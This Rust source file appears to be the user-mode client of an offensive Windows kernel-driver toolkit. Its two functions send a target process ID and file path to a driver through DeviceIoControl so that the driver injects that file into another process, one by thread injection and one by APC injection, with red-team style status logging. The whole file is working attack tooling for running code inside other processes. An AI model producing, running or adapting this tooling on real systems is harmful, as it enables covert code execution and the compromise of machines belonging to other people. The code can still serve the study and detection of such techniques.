use {
    crate::{driver::open_driver, utils::check_file}, 
    core::ffi::c_void, 
    shared::structs::TargetInjection, 
    std::ptr::null_mut, 
    windows_sys::Win32::{Foundation::CloseHandle, System::IO::DeviceIoControl} 
};

pub fn injection_thread(ioctl_code: u32, pid: &u32, path: &String) {
    println!("[*] Starting process injection for PID: {pid}, using file: {path}");

    println!("[*] Attempting to open the driver...");
    let h_file = open_driver().expect("Failed to open driver");
    let status;

    println!("[*] Preparing injection structure...");
    let mut info_injection = TargetInjection {
        path: path.to_string(),
        pid: *pid as usize
    };   

    println!("[*] Checking if the file exists at the specified path...");
    if !check_file(path) {
        eprintln!("[!] Error: File not found at the specified path: {path}. Please check the file path and try again.");
        return;
    }

    println!("[+] File found.");
    let mut return_buffer = 0;

    println!("[*] Initiating process injection...");
    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_injection as *mut _ as *mut c_void,
            std::mem::size_of::<TargetInjection>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        println!("[+] Success: Process injection was successfully performed on PID: {pid} using the file at path: {path}.");
    }

    println!("[*] Closing the driver handle...");
    unsafe { 
        CloseHandle(h_file);
    };

    println!("[+] Driver handle closed. Injection process completed.");
}

pub fn injection_apc(ioctl_code: u32, pid: &u32, path: &String) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    let mut info_injection = TargetInjection {
        path: path.to_string(),
        pid: *pid as usize
    };   
    let mut return_buffer = 0;
    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_injection as *mut _ as *mut c_void,
            std::mem::size_of::<TargetInjection>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        println!("[+] Process injection APC successfully performed on PID: {pid}");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}
